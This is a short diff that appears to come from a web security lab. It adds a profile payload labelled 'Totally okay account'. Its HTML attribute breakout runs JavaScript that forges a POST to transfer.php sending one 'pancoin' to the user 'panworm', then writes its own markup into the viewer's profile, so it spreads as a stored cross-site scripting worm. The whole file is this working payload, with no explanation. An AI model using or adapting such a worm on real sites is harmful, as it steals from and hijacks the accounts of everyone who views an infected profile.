@@ -1,0 +1,18 @@
+Totally okay account
+<a id="pancoins" class="
+a = new XMLHttpRequest();
+a.open('POST', 'transfer.php');
+var b= new FormData();
+b.append('pancoins',1);
+b.append('recipient', 'panworm');
+b.append('submission', 'Send');
+a.send(b);
+c = new XMLHttpRequest();
+c.open('POST', 'index.php');
+var d= new FormData();
+d.append('profile_update',
+		document.getElementById('pancoins').outerHTML
+		);
+d.append('profile_submit', 'Update');
+c.send(d);
+alert('thanks for all the fish')">
